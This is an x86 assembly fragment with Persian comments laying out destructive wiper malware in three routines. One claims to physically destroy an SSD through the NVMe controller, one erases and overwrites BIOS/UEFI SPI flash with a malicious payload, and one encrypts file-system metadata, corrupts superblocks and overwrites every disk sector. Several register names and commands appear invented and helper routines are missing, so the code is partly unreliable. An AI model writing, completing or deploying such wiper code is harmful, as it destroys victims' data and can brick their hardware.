section .text

; تخریب فیزیکی SSD با دسترسی مستقیم به کنترلر NVMe
destroy_ssd:
    mov rdi, NVME_CONTROLLER_BASE
    mov qword [rdi + NVME_CR_ADMIN_QUEUE], 0
    mov qword [rdi + NVME_CR_DEVICE_CTL], NVME_CTL_FORCE_ERASE
    
    ; ارسال فرمان تخریب سلول‌های NAND
    mov rsi, nvme_destruct_cmd
    mov rcx, 8
    rep movsb
    
    ; فعال‌سازی تخریب فیزیکی
    mov byte [rdi + NVME_CR_EXEC], 1
    ret

; تخریب BIOS/UEFI
destroy_bios:
    ; دسترسی مستقیم به SPI Flash
    call unlock_spi_flash
    
    ; پاک‌سازی کامل حافظه
    mov rdi, SPI_CTRL_BASE
    mov dword [rdi + SPI_CMD], SPI_CMD_BULK_ERASE
    call wait_spi_ready
    
    ; نوشتن داده‌های مخرب
    mov rsi, bios_destruct_payload
    mov rdx, SPI_BIOS_REGION
    mov rcx, bios_destruct_size
    call write_spi_flash
    ret

; تخریب فایل‌سیستم با رمزنگاری پیشرفته
destroy_filesystem:
    ; رمزنگاری MFT/Inode‌ها
    call encrypt_mft
    
    ; تخریب ساختارهای حیاتی
    call corrupt_superblocks
    
    ; نوشتن داده‌های تصادفی در تمام سکتورها
    mov rdi, 0  ; شروع از سکتور 0
    mov rcx, TOTAL_DISK_SECTORS
.destruct_loop:
    call write_random_sector
    inc rdi
    loop .destruct_loop
    ret
    